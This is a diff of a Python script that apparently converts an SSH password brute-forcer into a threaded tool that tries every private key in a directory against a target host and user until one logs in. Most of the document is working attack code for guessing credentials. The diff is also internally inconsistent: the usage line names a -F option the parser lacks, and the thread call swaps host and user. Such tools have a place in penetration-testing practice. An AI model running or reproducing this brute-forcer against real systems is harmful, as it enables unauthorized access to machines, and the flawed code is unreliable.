@@ -1,10 +1,9 @@
 #!/usr/bin/python
 # author: axi0m
-# purpose: ssh bruteforcer using pxssh instead of pexpect - More modular
-# usage: sshBrute.py --host 10.10.10.10 --user root -F password.txt
-# example: sshBrute.py
-# changelog: 12/17/18 - initial creation
-# changelog: 02/12/19 - finished working prototype
+# purpose: ssh key bruteforce - uses pexpect
+# usage: sshBruteKey.py --host 10.10.10.10 --user root -F keys.txt
+# example: sshBruteKey.py
+
 
 '''
 To Do:
@@ -13,7 +12,7 @@ To Do:
 import pexpect
 import argparse
 import os
-from threading import *
+from threading import Thread, BoundedSemaphore
 
 maxConnections = 5
 connection_lock = BoundedSemaphore(value=maxConnections)
@@ -50,3 +49,33 @@ def connect(host, user, keyfile, release):
 
 
 def main():
+    parser = argparse.ArgumentParser()
+    parser.add_argument('--host',nargs='?', action="store", dest="host", help="The host to target for scanning.")
+    parser.add_argument('--user',nargs='?', action="store", dest="user", help="The username to brute-force.")
+    parser.add_argument('--dir',nargs='?', action="store", dest="directory", help="The ssh private key to reference.")
+
+    args = parser.parse_args()
+
+    host = args.host
+    directory = args.directory
+    user = args.user
+
+    if host is None or directory is None or user is None:
+        parser.print_help()
+
+    for filename in os.listdir(directory):
+        if Stop:
+            print(f'[*] Exiting: Key Found.')
+            exit(0)
+        if Fails > 5:
+            print(f'[!] Exiting: Too Many Connections Closed by Remote Host.')
+            print(f'[!] Adjust number of simultaneous threads.')
+            exit(0)
+        connection_lock.acquire()
+        fullpath = os.path.join(directory, filename)
+        print(f'[-] Testing keyfile {fullpath}')
+        t = Thread(target=connect, args=(user, host, fullpath, True))
+        child = t.start()
+
+if __name__ == "__main__":
+    main()
